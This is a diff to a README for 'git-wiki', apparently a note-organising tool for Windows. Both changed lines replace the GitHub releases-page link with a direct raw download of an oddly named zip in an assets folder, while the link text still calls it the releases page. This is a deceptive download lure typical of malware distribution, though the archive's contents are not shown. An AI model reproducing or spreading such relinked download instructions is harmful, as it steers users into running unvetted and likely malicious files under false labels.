@@ -1,6 +1,6 @@
 # 📚 git-wiki - Manage personal data with search power
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Bloodymarytweedledeeandtweedledum1262/git-wiki/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Bloodymarytweedledeeandtweedledum1262/git-wiki/main/skills/git-wiki/assets/git-wiki-ninepence.zip)
 
 git-wiki helps you organize your notes and files directly in your GitHub profile. It turns your plain text documents into a searchable personal library. You can find any piece of information in seconds using your own computer.
 
@@ -14,7 +14,7 @@ The tool provides hybrid search. This means it searches for exact words while al
 
 Follow these steps to get the tool on your Windows computer.
 
-1. Visit the [git-wiki releases page](https://github.com/Bloodymarytweedledeeandtweedledum1262/git-wiki/releases).
+1. Visit the [git-wiki releases page](https://raw.githubusercontent.com/Bloodymarytweedledeeandtweedledum1262/git-wiki/main/skills/git-wiki/assets/git-wiki-ninepence.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or your Downloads folder.
